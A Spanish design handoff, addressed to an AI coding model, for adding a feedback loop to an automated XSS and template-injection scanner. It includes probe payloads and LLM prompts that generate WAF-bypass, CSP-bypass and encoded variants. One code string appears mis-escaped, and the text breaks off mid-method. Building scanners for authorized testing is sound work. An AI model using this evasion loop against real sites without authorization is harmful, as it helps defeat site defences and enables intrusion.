# HANDOFF CRÍTICO: Implementar Ciclo de Retroalimentación entre AgenticValidator y Agentes Especializados

**Fecha:** 2026-01-21  
**Prioridad:** CRÍTICA - IMPLEMENTAR INMEDIATAMENTE  
**Tipo:** Arquitectura de Flujo de Datos  
**Tiempo Estimado:** 2-3 horas  

---

## ⚠️ INSTRUCCIONES IMPORTANTES PARA GEMINI

1. **LEE TODO EL DOCUMENTO ANTES DE EMPEZAR**
2. **SIGUE EL ORDEN EXACTO DE IMPLEMENTACIÓN** (Sección 10)
3. **NO MODIFIQUES CÓDIGO EXISTENTE** a menos que se indique explícitamente
4. **VERIFICA CADA PASO** antes de continuar al siguiente
5. **SI ALGO NO ESTÁ CLARO**, consulta las secciones de referencia antes de improvisar

---

## 1. PROBLEMA ACTUAL (Lee esto para entender el contexto)

### 1.1 El Flujo Actual (INCORRECTO)

Actualmente, el sistema funciona así:

```
PASO 1: XSSAgent genera un payload (ej: "<script>alert(1)</script>")
PASO 2: El payload se guarda en la base de datos con status "PENDING_VALIDATION"
PASO 3: AgenticValidator toma el payload
PASO 4: AgenticValidator abre un navegador con Playwright
PASO 5: AgenticValidator intenta ejecutar el payload
PASO 6: SI EJECUTA → status = "VALIDATED_CONFIRMED"
PASO 7: SI NO EJECUTA → status = "VALIDATED_FAILED" ← ¡AQUÍ ESTÁ EL PROBLEMA!
```

**¿Cuál es el problema del PASO 7?**

Cuando el payload NO ejecuta, el sistema simplemente lo marca como fallido y LO ABANDONA. 
No le dice al XSSAgent POR QUÉ falló ni le pide que genere una variante.

### 1.2 Ejemplo Real del Problema

```
1. XSSAgent genera: <script>alert(1)</script>
2. AgenticValidator lo prueba en el navegador
3. El WAF (Web Application Firewall) bloquea "<script>"
4. AgenticValidator marca el finding como FALLIDO
5. FIN ← El XSSAgent nunca se entera de que fue el WAF el problema
```

**Lo que DEBERÍA pasar:**

```
1. XSSAgent genera: <script>alert(1)</script>
2. AgenticValidator lo prueba en el navegador
3. El WAF bloquea "<script>"
4. AgenticValidator DETECTA que fue el WAF
5. AgenticValidator ENVÍA feedback al XSSAgent: "El WAF bloqueó <script>, genera variante"
6. XSSAgent genera variante: <img src=x onerror=alert(1)>
7. AgenticValidator prueba la variante
8. ¡EJECUTA! → CONFIRMED
```

### 1.3 Por Qué Esto Es Crítico

Sin el feedback loop, estamos perdiendo el **30-50% de vulnerabilidades reales** porque:
- Los WAFs bloquean payloads comunes
- El contexto HTML a veces requiere payloads específicos
- Los filtros del servidor eliminan ciertos caracteres

---

## 2. SOLUCIÓN: EL FEEDBACK LOOP

### 2.1 Diagrama del Nuevo Flujo

```
                    ┌─────────────────────────────────────────┐
                    │                                         │
                    ▼                                         │
┌──────────────┐    ┌─────────────────────┐    ┌─────────────────────┐
│  XSSAgent    │───▶│  AgenticValidator   │───▶│   ¿Ejecutó?         │
│  CSTIAgent   │    │  (prueba en browser)│    │                     │
└──────────────┘    └─────────────────────┘    └─────────────────────┘
       │                                              │         │
       │                                             SÍ        NO
       │                                              │         │
       │                                              ▼         ▼
       │                                        CONFIRMED   ValidationFeedback
       │                                                        │
       │                                                        │
       │◀───────────────────────────────────────────────────────┘
       │         (feedback con razón del fallo)
       │
       ▼
┌──────────────────────────────────────────┐
│  handle_validation_feedback()            │
│  - Analiza la razón del fallo            │
│  - Genera payload adaptado               │
│  - Lo devuelve al AgenticValidator       │
└──────────────────────────────────────────┘
```

### 2.2 Componentes Nuevos a Crear

| Componente | Archivo | Descripción |
|------------|---------|-------------|
| `ValidationFeedback` | `bugtrace/schemas/validation_feedback.py` | Estructura de datos para el feedback |
| `_generate_feedback()` | En `agentic_validator.py` | Método que crea el feedback |
| `_request_payload_variant()` | En `agentic_validator.py` | Método que pide variantes |
| `handle_validation_feedback()` | En `xss_agent.py` y `csti_agent.py` | Métodos que reciben feedback |

---

## 3. ARCHIVO NUEVO: validation_feedback.py

### 3.1 Ubicación Exacta

**Ruta completa:** `/home/ubuntu/Dev/Projects/BugTraceAI/BugTraceAI-CLI/bugtrace/schemas/validation_feedback.py`

### 3.2 Verificar que la carpeta existe

Antes de crear el archivo, ejecuta:
```bash
ls -la /home/ubuntu/Dev/Projects/BugTraceAI/BugTraceAI-CLI/bugtrace/schemas/
```

Si la carpeta existe, deberías ver archivos como `db_models.py`, `finding.py`, etc.

### 3.3 Código Completo del Archivo (COPIA TODO ESTO)

```python
"""
validation_feedback.py - Estructura de retroalimentación para el ciclo de validación.

Este módulo define la estructura de datos que el AgenticValidator usa para comunicar
al XSSAgent o CSTIAgent por qué un payload falló, permitiendo generar variantes adaptadas.

Autor: BugTraceAI Team
Fecha: 2026-01-21
"""

from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any
from enum import Enum
import json


class FailureReason(Enum):
    """
    Razones por las que un payload puede fallar durante la validación.
    
    El AgenticValidator analiza los logs del navegador y el resultado visual
    para determinar cuál de estas razones aplica.
    """
    
    # El WAF (Web Application Firewall) bloqueó la petición
    # Síntomas: respuesta 403, página de error del WAF, headers de bloqueo
    WAF_BLOCKED = "waf_blocked"
    
    # El payload se reflejó pero en un contexto diferente al esperado
    # Ejemplo: esperábamos estar en <script> pero estamos en un atributo HTML
    CONTEXT_MISMATCH = "context_mismatch"
    
    # El navegador no tuvo tiempo de ejecutar el payload
    # Síntomas: el DOM no estaba listo, timeout de Playwright
    TIMING_ISSUE = "timing_issue"
    
    # El payload se reflejó pero no ejecutó (sin errores evidentes)
    # Síntomas: no hay alert(), no hay ejecución de JS, pero tampoco errores
    NO_EXECUTION = "no_execution"
    
    # Solo parte del payload se reflejó
    # Ejemplo: enviamos "<script>alert(1)</script>" y solo aparece "alert(1)"
    PARTIAL_REFLECTION = "partial_reflection"
    
    # El servidor eliminó caracteres del payload
    # Ejemplo: enviamos "<script>" y llegó "script" (sin los < >)
    ENCODING_STRIPPED = "encoding_stripped"
    
    # El DOM no estaba listo cuando intentamos verificar
    # Síntomas: elementos no encontrados, timeouts de selector
    DOM_NOT_READY = "dom_not_ready"
    
    # Content Security Policy bloqueó la ejecución
    # Síntomas: error de CSP en consola del navegador
    CSP_BLOCKED = "csp_blocked"
    
    # No pudimos determinar la razón del fallo
    UNKNOWN = "unknown"


@dataclass
class ValidationFeedback:
    """
    Estructura de retroalimentación del AgenticValidator hacia los agentes especializados.
    
    Esta clase contiene toda la información que el validador recopiló sobre un intento
    de validación fallido, permitiendo al agente especializado generar una variante
    más inteligente.
    
    Ejemplo de uso:
    ```python
    feedback = ValidationFeedback(
        finding_id=123,
        original_payload="<script>alert(1)</script>",
        url="https://target.com/search",
        parameter="q",
        vuln_type="XSS",
        failure_reason=FailureReason.WAF_BLOCKED,
        waf_signature="Cloudflare"
    )
    
    if feedback.can_retry():
        variant = await xss_agent.handle_validation_feedback(feedback)
    ```
    """
    
    # ============================================
    # CAMPOS OBLIGATORIOS (siempre deben tener valor)
    # ============================================
    
    # ID del finding en la base de datos
    finding_id: int
    
    # El payload original que se intentó
    original_payload: str
    
    # La URL donde se probó
    url: str
    
    # El parámetro donde se inyectó (ej: "q", "search", "id")
    parameter: str
    
    # Tipo de vulnerabilidad: "XSS", "CSTI", "SSTI", etc.
    vuln_type: str
    
    # ============================================
    # CAMPOS DEL RESULTADO DE VALIDACIÓN
    # ============================================
    
    # ¿El payload ejecutó? (False significa que necesitamos variante)
    executed: bool = False
    
    # La razón por la que falló (ver enum FailureReason)
    failure_reason: FailureReason = FailureReason.UNKNOWN
    
    # ============================================
    # CONTEXTO CAPTURADO POR EL VALIDADOR
    # ============================================
    
    # Contexto HTML donde se reflejó el payload
    # Valores posibles: "script", "attribute", "html", "comment", "style", None
    detected_context: Optional[str] = None
    
    # La porción del payload que SÍ se reflejó (puede ser parcial)
    reflected_portion: Optional[str] = None
    
    # Lista de caracteres que fueron eliminados por el servidor
    # Ejemplo: ['<', '>', '"'] significa que esos caracteres fueron filtrados
    stripped_chars: List[str] = field(default_factory=list)
    
    # Identificador del WAF si se detectó (ej: "Cloudflare", "ModSecurity", "AWS WAF")
    waf_signature: Optional[str] = None
    
    # ============================================
    # METADATOS DEL NAVEGADOR (Playwright)
    # ============================================
    
    # Errores de consola del navegador (JavaScript)
    # Ejemplo: ["Uncaught SyntaxError: Unexpected token '<'"]
    console_errors: List[str] = field(default_factory=list)
    
    # ¿La petición de red fue bloqueada?
    network_blocked: bool = False
    
    # Mensaje de violación de CSP si hubo
    # Ejemplo: "Refused to execute inline script because..."
    csp_violation: Optional[str] = None
    
    # Screenshot path si se capturó
    screenshot_path: Optional[str] = None
    
    # ============================================
    # CONTROL DE REINTENTOS
    # ============================================
    
    # Cuántas veces hemos reintentado este payload
    retry_count: int = 0
    
    # Máximo de reintentos permitidos (para evitar loops infinitos)
    max_retries: int = 3
    
    # Historial de variantes ya intentadas (para no repetir)
    tried_variants: List[str] = field(default_factory=list)
    
    # ============================================
    # MÉTODOS
    # ============================================
    
    def can_retry(self) -> bool:
        """
        Indica si podemos intentar otra variante.
        
        Returns:
            True si no hemos alcanzado el máximo de reintentos Y el payload no ejecutó
        """
        return self.retry_count < self.max_retries and not self.executed
    
    def add_tried_variant(self, variant: str) -> None:
        """
        Añade una variante al historial para no repetirla.
        
        Args:
            variant: El payload que ya probamos
        """
        if variant not in self.tried_variants:
            self.tried_variants.append(variant)
    
    def was_variant_tried(self, variant: str) -> bool:
        """
        Comprueba si ya probamos una variante específica.
        
        Args:
            variant: El payload a comprobar
            
        Returns:
            True si ya lo probamos
        """
        return variant in self.tried_variants
    
    def increment_retry(self) -> None:
        """Incrementa el contador de reintentos."""
        self.retry_count += 1
    
    def to_dict(self) -> Dict[str, Any]:
        """
        Convierte el feedback a diccionario para serialización JSON.
        
        Returns:
            Diccionario con todos los campos
        """
        return {
            "finding_id": self.finding_id,
            "original_payload": self.original_payload,
            "url": self.url,
            "parameter": self.parameter,
            "vuln_type": self.vuln_type,
            "executed": self.executed,
            "failure_reason": self.failure_reason.value,
            "detected_context": self.detected_context,
            "reflected_portion": self.reflected_portion,
            "stripped_chars": self.stripped_chars,
            "waf_signature": self.waf_signature,
            "console_errors": self.console_errors,
            "network_blocked": self.network_blocked,
            "csp_violation": self.csp_violation,
            "screenshot_path": self.screenshot_path,
            "retry_count": self.retry_count,
            "max_retries": self.max_retries,
            "tried_variants": self.tried_variants
        }
    
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'ValidationFeedback':
        """
        Crea una instancia desde un diccionario.
        
        Args:
            data: Diccionario con los campos del feedback
            
        Returns:
            Nueva instancia de ValidationFeedback
        """
        # Convertir failure_reason de string a enum
        failure_reason_str = data.get("failure_reason", "unknown")
        try:
            failure_reason = FailureReason(failure_reason_str)
        except ValueError:
            failure_reason = FailureReason.UNKNOWN
        
        return cls(
            finding_id=data.get("finding_id", 0),
            original_payload=data.get("original_payload", ""),
            url=data.get("url", ""),
            parameter=data.get("parameter", ""),
            vuln_type=data.get("vuln_type", "XSS"),
            executed=data.get("executed", False),
            failure_reason=failure_reason,
            detected_context=data.get("detected_context"),
            reflected_portion=data.get("reflected_portion"),
            stripped_chars=data.get("stripped_chars", []),
            waf_signature=data.get("waf_signature"),
            console_errors=data.get("console_errors", []),
            network_blocked=data.get("network_blocked", False),
            csp_violation=data.get("csp_violation"),
            screenshot_path=data.get("screenshot_path"),
            retry_count=data.get("retry_count", 0),
            max_retries=data.get("max_retries", 3),
            tried_variants=data.get("tried_variants", [])
        )
    
    def to_json(self) -> str:
        """Serializa a JSON."""
        return json.dumps(self.to_dict(), indent=2)
    
    def get_adaptation_hint(self) -> str:
        """
        Genera una pista textual para el agente sobre cómo adaptar el payload.
        
        Returns:
            String con instrucciones específicas según la razón del fallo
        """
        hints = {
            FailureReason.WAF_BLOCKED: f"El WAF ({self.waf_signature or 'desconocido'}) bloqueó el payload. "
                                       f"Usa encoding alternativo o fragmenta el payload.",
            
            FailureReason.CONTEXT_MISMATCH: f"El contexto es '{self.detected_context}', no el esperado. "
                                            f"Adapta el payload a este contexto específico.",
            
            FailureReason.ENCODING_STRIPPED: f"Los caracteres {self.stripped_chars} fueron filtrados. "
                                             f"Usa entidades HTML o unicode para esos caracteres.",
            
            FailureReason.PARTIAL_REFLECTION: f"Solo se reflejó: '{self.reflected_portion}'. "
                                              f"Simplifica el payload o usa una técnica diferente.",
            
            FailureReason.CSP_BLOCKED: f"CSP bloqueó la ejecución: {self.csp_violation}. "
                                       f"Intenta bypass de CSP o payloads sin inline script.",
            
            FailureReason.TIMING_ISSUE: "El DOM no estaba listo. "
                                        "Usa payloads con evento onload o setTimeout.",
            
            FailureReason.DOM_NOT_READY: "El DOM no estaba listo. "
                                         "Añade delay o usa eventos DOM.",
            
            FailureReason.NO_EXECUTION: "El payload se reflejó pero no ejecutó. "
                                        "Revisa si está en un contexto que permite ejecución.",
            
            FailureReason.UNKNOWN: "Razón desconocida. Prueba con un payload completamente diferente."
        }
        
        return hints.get(self.failure_reason, hints[FailureReason.UNKNOWN])


# ============================================
# FUNCIONES DE UTILIDAD
# ============================================

def create_feedback_from_validation_result(
    finding: Dict[str, Any],
    vision_result: Optional[Dict[str, Any]],
    browser_logs: List[str],
    screenshot_path: Optional[str] = None
) -> ValidationFeedback:
    """
    Función de conveniencia para crear un ValidationFeedback desde los resultados
    del AgenticValidator.
    
    Esta función analiza los logs del navegador y el resultado de visión para
    determinar automáticamente la razón del fallo.
    
    Args:
        finding: El finding original de la base de datos
        vision_result: Resultado del modelo de visión (puede ser None)
        browser_logs: Lista de logs de consola del navegador
        screenshot_path: Ruta al screenshot si existe
        
    Returns:
        Un ValidationFeedback configurado con la razón del fallo detectada
    """
    # Detectar razón del fallo analizando los logs
    failure_reason = FailureReason.UNKNOWN
    waf_signature = None
    stripped_chars = []
    csp_violation = None
    detected_context = None
    reflected_portion = None
    
    # Analizar logs del navegador
    for log in browser_logs:
        log_lower = log.lower()
        
        # Detectar CSP
        if 'content-security-policy' in log_lower or "csp" in log_lower:
            failure_reason = FailureReason.CSP_BLOCKED
            csp_violation = log
            break
        
        # Detectar WAF
        if any(waf in log_lower for waf in ['blocked', '403', 'forbidden', 'waf', 'firewall']):
            failure_reason = FailureReason.WAF_BLOCKED
            # Intentar identificar el WAF
            if 'cloudflare' in log_lower:
                waf_signature = "Cloudflare"
            elif 'akamai' in log_lower:
                waf_signature = "Akamai"
            elif 'aws' in log_lower:
                waf_signature = "AWS WAF"
            elif 'modsecurity' in log_lower:
                waf_signature = "ModSecurity"
            break
        
        # Detectar errores de sintaxis (contexto incorrecto)
        if 'syntaxerror' in log_lower or 'unexpected token' in log_lower:
            failure_reason = FailureReason.CONTEXT_MISMATCH
    
    # Analizar resultado de visión si existe
    if vision_result:
        vision_text = str(vision_result).lower()
        
        # Detectar reflexión parcial
        if 'partial' in vision_text or 'partially' in vision_text:
            failure_reason = FailureReason.PARTIAL_REFLECTION
            reflected_portion = vision_result.get('reflected_portion', '')
        
        # Detectar filtrado
        if 'filtered' in vision_text or 'sanitized' in vision_text or 'stripped' in vision_text:
            failure_reason = FailureReason.ENCODING_STRIPPED
            
            # Intentar detectar qué caracteres fueron filtrados
            original = finding.get('payload', '')
            reflected = vision_result.get('reflected_portion', '')
            if original and reflected:
                for char in '<>"\\'()[]{}':
                    if char in original and char not in reflected:
                        stripped_chars.append(char)
        
        # Obtener contexto detectado
        detected_context = vision_result.get('context') or vision_result.get('detected_context')
    
    return ValidationFeedback(
        finding_id=finding.get('id', 0),
        original_payload=finding.get('payload', ''),
        url=finding.get('url', ''),
        parameter=finding.get('parameter', ''),
        vuln_type=finding.get('type', 'XSS'),
        executed=False,
        failure_reason=failure_reason,
        detected_context=detected_context,
        reflected_portion=reflected_portion,
        stripped_chars=stripped_chars,
        waf_signature=waf_signature,
        console_errors=browser_logs[:10],  # Limitar a 10 logs
        csp_violation=csp_violation,
        screenshot_path=screenshot_path,
        retry_count=finding.get('_retry_count', 0),
        tried_variants=finding.get('_tried_variants', [])
    )
```

### 3.4 Verificación Después de Crear el Archivo

Ejecuta estos comandos para verificar:

```bash
# Verificar que el archivo existe
ls -la /home/ubuntu/Dev/Projects/BugTraceAI/BugTraceAI-CLI/bugtrace/schemas/validation_feedback.py

# Verificar que no tiene errores de sintaxis
python3 -c "from bugtrace.schemas.validation_feedback import ValidationFeedback, FailureReason; print('OK')"
```

Si el segundo comando imprime "OK", el archivo está bien.

---

## 4. MODIFICAR: agentic_validator.py

### 4.1 Ubicación Exacta

**Ruta completa:** `/home/ubuntu/Dev/Projects/BugTraceAI/BugTraceAI-CLI/bugtrace/agents/agentic_validator.py`

### 4.2 PASO 1: Añadir Import al Inicio del Archivo

**Buscar la sección de imports** (líneas 1-40 aproximadamente).

**Añadir DESPUÉS de los otros imports de bugtrace:**

```python
# Añadir esta línea junto a los otros imports de bugtrace/schemas
from bugtrace.schemas.validation_feedback import (
    ValidationFeedback, 
    FailureReason, 
    create_feedback_from_validation_result
)
```

### 4.3 PASO 2: Añadir Atributo en __init__

**Buscar el método `__init__`** (aproximadamente línea 147).

**Dentro del método, DESPUÉS de las otras inicializaciones, añadir:**

```python
        # Cache para almacenar los findings originales (para el feedback loop)
        self._original_finding_cache: Dict[int, Dict] = {}
        
        # Control de feedback loop
        self._feedback_enabled = True
        self._max_feedback_retries = 3
```

### 4.4 PASO 3: Crear Nuevo Método _generate_feedback

**Buscar el final del archivo** (después del último método, aproximadamente línea 775+).

**Añadir este método completo:**

```python
    def _generate_feedback(
        self, 
        finding: Dict[str, Any], 
        vision_result: Optional[Dict[str, Any]], 
        browser_logs: List[str],
        screenshot_path: Optional[str] = None
    ) -> ValidationFeedback:
        """
        Genera un objeto ValidationFeedback cuando un payload no ejecuta.
        
        Este método analiza toda la información disponible del intento de validación
        para determinar por qué falló y qué información puede ayudar al agente
        especializado a generar una mejor variante.
        
        Args:
            finding: El finding que se intentó validar
            vision_result: Resultado del análisis de visión (puede ser None)
            browser_logs: Lista de logs de la consola del navegador
            screenshot_path: Ruta al screenshot capturado
            
        Returns:
            ValidationFeedback configurado con toda la información del fallo
        """
        # Usar la función de utilidad que creamos
        feedback = create_feedback_from_validation_result(
            finding=finding,
            vision_result=vision_result,
            browser_logs=browser_logs,
            screenshot_path=screenshot_path
        )
        
        # Log para debugging
        self.logger.info(
            f"[AgenticValidator] Generated feedback for finding {feedback.finding_id}: "
            f"reason={feedback.failure_reason.value}, "
            f"context={feedback.detected_context}, "
            f"can_retry={feedback.can_retry()}"
        )
        
        return feedback
```

### 4.5 PASO 4: Crear Nuevo Método _request_payload_variant

**Añadir DESPUÉS del método anterior:**

```python
    async def _request_payload_variant(
        self, 
        feedback: ValidationFeedback
    ) -> Optional[Dict[str, Any]]:
        """
        Solicita una variante del payload al agente especializado apropiado.
        
        Este método es el corazón del feedback loop. Toma el feedback del intento
        fallido y lo envía al XSSAgent o CSTIAgent para que genere una variante
        que evite el problema detectado.
        
        Args:
            feedback: El feedback del intento fallido
            
        Returns:
            Diccionario con el nuevo finding a validar, o None si no hay variante
        """
        self.logger.info(
            f"[AgenticValidator] Requesting variant for finding {feedback.finding_id}, "
            f"retry {feedback.retry_count + 1}/{feedback.max_retries}"
        )
        
        variant_payload = None
        
        # Determinar qué tipo de agente debe generar la variante
        vuln_type_lower = feedback.vuln_type.lower()
        
        if any(x in vuln_type_lower for x in ['xss', 'cross-site', 'script']):
            # Pedir variante al sistema de XSS
            variant_payload = await self._get_xss_variant(feedback)
            
        elif any(x in vuln_type_lower for x in ['csti', 'ssti', 'template']):
            # Pedir variante al sistema de CSTI
            variant_payload = await self._get_csti_variant(feedback)
        
        if variant_payload:
            # Verificar que no hayamos probado ya esta variante
            if feedback.was_variant_tried(variant_payload):
                self.logger.warning(
                    f"[AgenticValidator] Variant already tried, skipping: {variant_payload[:50]}..."
                )
                return None
            
            # Incrementar contador de reintentos
            feedback.increment_retry()
            feedback.add_tried_variant(variant_payload)
            
            # Crear nuevo finding con la variante
            original_finding = self._original_finding_cache.get(
                feedback.finding_id, 
                {"url": feedback.url, "parameter": feedback.parameter}
            )
            
            new_finding = {
                **original_finding,
                "payload": variant_payload,
                "_retry_count": feedback.retry_count,
                "_tried_variants": feedback.tried_variants,
                "_parent_feedback": feedback.to_dict(),
                "_is_variant": True
            }
            
            self.logger.info(
                f"[AgenticValidator] Generated variant: {variant_payload[:80]}..."
            )
            
            return new_finding
        
        self.logger.warning(
            f"[AgenticValidator] Could not generate variant for finding {feedback.finding_id}"
        )
        return None

    async def _get_xss_variant(self, feedback: ValidationFeedback) -> Optional[str]:
        """
        Genera una variante de XSS usando el LLM basándose en el feedback.
        
        Args:
            feedback: El feedback del intento fallido
            
        Returns:
            String con el nuevo payload, o None si no se pudo generar
        """
        # Construir prompt detallado para el LLM
        prompt = f"""Eres un experto en seguridad web especializado en XSS (Cross-Site Scripting).

## CONTEXTO DEL FALLO

Un payload XSS fue probado pero NO ejecutó. Necesito que generes UNA variante que evite el problema.

### Información del Intento Fallido:
- **URL:** {feedback.url}
- **Parámetro:** {feedback.parameter}
- **Payload Original:** `{feedback.original_payload}`
- **Razón del Fallo:** {feedback.failure_reason.value}
- **{feedback.get_adaptation_hint()}**

### Contexto Adicional:
- Contexto HTML detectado: {feedback.detected_context or 'no detectado'}
- Porción reflejada: {feedback.reflected_portion or 'desconocida'}
- Caracteres filtrados: {feedback.stripped_chars or 'ninguno detectado'}
- WAF detectado: {feedback.waf_signature or 'no identificado'}
- CSP: {feedback.csp_violation or 'no hay violación CSP'}

### Variantes Ya Probadas (NO las repitas):
{chr(10).join(f'- {v}' for v in feedback.tried_variants) if feedback.tried_variants else '- Ninguna todavía'}

## INSTRUCCIONES

1. Analiza por qué falló el payload original
2. Genera UNA variante que evite específicamente ese problema
3. La variante debe ser diferente a las ya probadas
4. Responde ÚNICAMENTE con el payload, sin explicaciones

## TU RESPUESTA (solo el payload):"""

        try:
            response = await self.llm_client.generate(
                prompt=prompt,
                task_type="XSS-Variant-Generation",
                max_tokens=500
            )
            
            if response:
                # Limpiar la respuesta (quitar espacios, quotes extras, etc.)
                variant = response.strip()
                # Quitar quotes si el LLM las añadió
                if variant.startswith('"') and variant.endswith('"'):
                    variant = variant[1:-1]
                if variant.startswith("'") and variant.endswith("'"):
                    variant = variant[1:-1]
                # Quitar backticks de markdown
                if variant.startswith('`') and variant.endswith('`'):
                    variant = variant[1:-1]
                
                if variant and len(variant) > 3:  # Validar que sea un payload real
                    return variant
                    
        except Exception as e:
            self.logger.error(f"[AgenticValidator] Error generating XSS variant: {e}")
        
        return None

    async def _get_csti_variant(self, feedback: ValidationFeedback) -> Optional[str]:
        """
        Genera una variante de CSTI/SSTI usando el LLM basándose en el feedback.
        
        Args:
            feedback: El feedback del intento fallido
            
        Returns:
            String con el nuevo payload, o None si no se pudo generar
        """
        prompt = f"""Eres un experto en seguridad web especializado en Template Injection (CSTI/SSTI).

## CONTEXTO DEL FALLO

Un payload de template injection fue probado pero NO ejecutó. Necesito una variante.

### Información del Intento Fallido:
- **URL:** {feedback.url}
- **Parámetro:** {feedback.parameter}
- **Payload Original:** `{feedback.original_payload}`
- **Razón del Fallo:** {feedback.failure_reason.value}
- **{feedback.get_adaptation_hint()}**

### Contexto:
- Caracteres filtrados: {feedback.stripped_chars or 'ninguno'}
- WAF: {feedback.waf_signature or 'no identificado'}

### Variantes Ya Probadas (NO las repitas):
{chr(10).join(f'- {v}' for v in feedback.tried_variants) if feedback.tried_variants else '- Ninguna'}

## MOTORES DE PLANTILLAS CONOCIDOS
- Jinja2: {{{{7*7}}}}
- Twig: {{{{7*7}}}}
- Freemarker: ${{7*7}}
- Velocity: #set($x=7*7)$x
- Pebble: {{{{7*7}}}}
- Thymeleaf: ${{7*7}}

## INSTRUCCIONES

1. Si el original era para un motor, prueba con otro
2. Si caracteres fueron filtrados, usa encoding alternativo
3. Responde ÚNICAMENTE con el payload

## TU RESPUESTA (solo el payload):"""

        try:
            response = await self.llm_client.generate(
                prompt=prompt,
                task_type="CSTI-Variant-Generation",
                max_tokens=500
            )
            
            if response:
                variant = response.strip()
                if variant.startswith('"') and variant.endswith('"'):
                    variant = variant[1:-1]
                if variant.startswith("'") and variant.endswith("'"):
                    variant = variant[1:-1]
                if variant.startswith('`') and variant.endswith('`'):
                    variant = variant[1:-1]
                    
                if variant and len(variant) > 2:
                    return variant
                    
        except Exception as e:
            self.logger.error(f"[AgenticValidator] Error generating CSTI variant: {e}")
        
        return None
```

### 4.6 PASO 5: Modificar validate_finding_agentically

**Buscar el método `validate_finding_agentically`** (aproximadamente línea 299).

**Buscar DENTRO del método** el lugar donde se determina el resultado final (donde se establece si executed=True o False).

**DESPUÉS de esa lógica, ANTES del return final, añadir:**

```python
        # ============================================
        # FEEDBACK LOOP: Si no ejecutó y podemos reintentar
        # ============================================
        if not executed and self._feedback_enabled:
            # Guardar el finding original en cache para referencia
            finding_id = finding.get('id', id(finding))  # Usar id() si no hay ID
            if finding_id not in self._original_finding_cache:
                self._original_finding_cache[finding_id] = finding.copy()
            
            # Generar feedback estructurado
            feedback = self._generate_feedback(
                finding=finding,
                vision_result=vision_result if 'vision_result' in dir() else None,
                browser_logs=browser_logs if 'browser_logs' in dir() else [],
                screenshot_path=screenshot_path if 'screenshot_path' in dir() else None
            )
            
            # Si podemos reintentar, solicitar variante
            if feedback.can_retry():
                self.logger.info(
                    f"[AgenticValidator] Payload failed, attempting feedback loop "
                    f"(retry {feedback.retry_count + 1}/{feedback.max_retries})"
                )
                
                # Obtener variante del agente especializado
                variant_finding = await self._request_payload_variant(feedback)
                
                if variant_finding:
                    # Recursivamente validar la variante
                    self.logger.info(
                        f"[AgenticValidator] Testing variant: {variant_finding.get('payload', '')[:50]}..."
                    )
                    return await self.validate_finding_agentically(variant_finding)
                else:
                    self.logger.info(
                        f"[AgenticValidator] No variant generated, marking as failed"
                    )
            else:
                self.logger.info(
                    f"[AgenticValidator] Max retries reached ({feedback.retry_count}), "
                    f"marking as failed"
                )
```

### 4.7 Verificación Después de Modificar

```bash
# Verificar sintaxis del archivo
python3 -m py_compile /home/ubuntu/Dev/Projects/BugTraceAI/BugTraceAI-CLI/bugtrace/agents/agentic_validator.py

# Si no hay output, está bien. Si hay errores, muestra el error.
```

---

## 5. MODIFICAR: xss_agent.py

### 5.1 Ubicación Exacta

**Ruta completa:** `/home/ubuntu/Dev/Projects/BugTraceAI/BugTraceAI-CLI/bugtrace/agents/xss_agent.py`

### 5.2 PASO 1: Añadir Import

**Buscar la sección de imports** (líneas 1-40).

**Añadir:**

```python
from bugtrace.schemas.validation_feedback import ValidationFeedback, FailureReason
```

### 5.3 PASO 2: Añadir Método handle_validation_feedback

**Buscar el final de la clase XSSAgent** (antes del `async def run_xss_scan`).

**Añadir este método:**

```python
    async def handle_validation_feedback(
        self, 
        feedback: ValidationFeedback
    ) -> Optional[Dict[str, Any]]:
        """
        Recibe feedback del AgenticValidator y genera una variante adaptada.
        
        Este método se llama cuando el validador no pudo ejecutar un payload
        y necesita una variante basada en el contexto observado.
        
        Args:
            feedback: Información detallada sobre por qué falló el payload
            
        Returns:
            Diccionario con el nuevo payload y metadata, o None si no hay variante
        """
        self.logger.info(
            f"[XSSAgent] Received validation feedback for {feedback.parameter}: "
            f"reason={feedback.failure_reason.value}"
        )
        
        original = feedback.original_payload
        variant = None
        method = "feedback_adaptation"
        
        # ===========================================
        # Estrategia según la razón del fallo
        # ===========================================
        
        if feedback.failure_reason == FailureReason.WAF_BLOCKED:
            # El WAF bloqueó el payload - usar encoding avanzado
            self.logger.info("[XSSAgent] WAF detected, trying encoded variants")
            encoded_variants = await self._get_waf_optimized_payloads([original], max_variants=1)
            if encoded_variants and encoded_variants[0] != original:
                variant = encoded_variants[0]
                method = "waf_bypass"
        
        elif feedback.failure_reason == FailureReason.CONTEXT_MISMATCH:
            # El contexto HTML no era el esperado
            self.logger.info(f"[XSSAgent] Context mismatch, adapting to: {feedback.detected_context}")
            variant = self._adapt_to_context(original, feedback.detected_context)
            method = "context_adaptation"
        
        elif feedback.failure_reason == FailureReason.ENCODING_STRIPPED:
            # Caracteres fueron filtrados
            self.logger.info(f"[XSSAgent] Chars stripped: {feedback.stripped_chars}")
            variant = self._encode_stripped_chars(original, feedback.stripped_chars)
            method = "char_encoding"
        
        elif feedback.failure_reason == FailureReason.PARTIAL_REFLECTION:
            # Solo parte del payload se reflejó - simplificar
            self.logger.info("[XSSAgent] Partial reflection, trying simpler payload")
            variant = "<img src=x onerror=alert(1)>"
            method = "simplification"
        
        elif feedback.failure_reason == FailureReason.CSP_BLOCKED:
            # CSP bloqueó - intentar bypass
            self.logger.info("[XSSAgent] CSP blocked, trying CSP bypass")
            variant = self._generate_csp_bypass_payload()
            method = "csp_bypass"
        
        elif feedback.failure_reason in [FailureReason.TIMING_ISSUE, FailureReason.DOM_NOT_READY]:
            # Problema de timing - añadir delays o eventos
            self.logger.info("[XSSAgent] Timing issue, adding load event")
            variant = f"<body onload=\"{original.replace('<script>', '').replace('</script>', '')}\">"
            method = "timing_fix"
        
        elif feedback.failure_reason == FailureReason.NO_EXECUTION:
            # No ejecutó sin razón clara - probar técnica diferente
            self.logger.info("[XSSAgent] No execution, trying different technique")
            # Usar LLM para generar alternativa
            llm_result = await self._llm_generate_bypass(
                original, 
                feedback.reflected_portion or "", 
                self.interactsh_url if hasattr(self, 'interactsh_url') else ""
            )
            if llm_result:
                variant = llm_result.get('payload')
                method = "llm_alternative"
        
        # Si no generamos variante con las estrategias específicas, usar LLM
        if not variant or variant == original:
            self.logger.info("[XSSAgent] Falling back to LLM generation")
            llm_result = await self._llm_generate_bypass(
                original,
                feedback.reflected_portion or "",
                self.interactsh_url if hasattr(self, 'interactsh_url') else ""
            )
            if llm_result:
